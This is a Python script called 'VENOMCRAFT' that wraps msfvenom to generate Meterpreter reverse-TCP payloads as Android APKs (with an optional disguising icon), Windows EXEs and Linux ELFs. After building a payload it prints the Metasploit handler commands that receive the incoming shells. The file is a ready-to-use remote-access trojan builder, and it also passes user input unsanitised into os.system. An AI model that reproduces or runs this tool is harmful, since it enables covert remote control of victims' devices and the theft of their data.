import os
import sys

def banner():
    print(r"""
       _____
    .-'     `-.
   /           \
  |  .--. .--.  |
  | (    Y    ) |
   \  '--'--'  /
    `-._____.-'
       /  /
      /  /
     /  /  
    (  (   ~~~
     \  \  ~~~
      \  \ ~~~
       '--'

      V E N O M C R A F T
   Payload Creator by TR4N5P4R3NT
    """)

def get_icon_path():
    icon = input("Enter path to JPG icon file for payload (or press Enter to skip): ").strip()
    if icon and os.path.isfile(icon) and icon.lower().endswith('.jpg'):
        print(f"[✔] Icon file set to: {icon}")
        return icon
    elif icon:
        print("[!] Invalid file or not a JPG. Skipping icon.")
    return None

def generate_payload(platform, payload):
    print(f"\n[*] Generating {platform} payload...")
    lhost = input("LHOST (your IP): ").strip()
    lport = input("LPORT (e.g. 4444): ").strip()
    output = input("Output filename (without extension): ").strip()
    if not output:
        print("[!] Output filename cannot be empty.")
        return
    
    icon = None
    if platform == "Android":
        icon = get_icon_path()

    ext = "apk" if platform == "Android" else "exe" if platform == "Windows" else "elf"
    filename = f"payloads/{output}.{ext}"

    os.makedirs("payloads", exist_ok=True)

    # Build msfvenom command
    if icon:
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {filename} Icon={icon}"
    else:
        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {filename}"

    print(f"\n[*] Running command:\n{cmd}\n")
    result = os.system(cmd)

    if result == 0:
        print("[✔] Payload created successfully!")
        print("\nTo use the payload, start Metasploit and run:\n")
        print(f"msfconsole\nuse exploit/multi/handler\nset payload {payload}\nset LHOST {lhost}\nset LPORT {lport}\nrun\n")
    else:
        print("[✘] Payload generation failed. Check msfvenom installation and parameters.")

def main_menu():
    while True:
        banner()
        print("Select Platform:")
        print("1) Android (apk)")
        print("2) Windows (exe)")
        print("3) Linux (elf)")
        print("0) Exit")
        choice = input("Choice > ").strip()

        if choice == '1':
            generate_payload("Android", "android/meterpreter/reverse_tcp")
        elif choice == '2':
            generate_payload("Windows", "windows/meterpreter/reverse_tcp")
        elif choice == '3':
            generate_payload("Linux", "linux/x86/meterpreter/reverse_tcp")
        elif choice == '0':
            print("Exiting... Stay venomous!")
            sys.exit()
        else:
            print("Invalid choice. Try again.\n")

if __name__ == "__main__":
    main_menu()
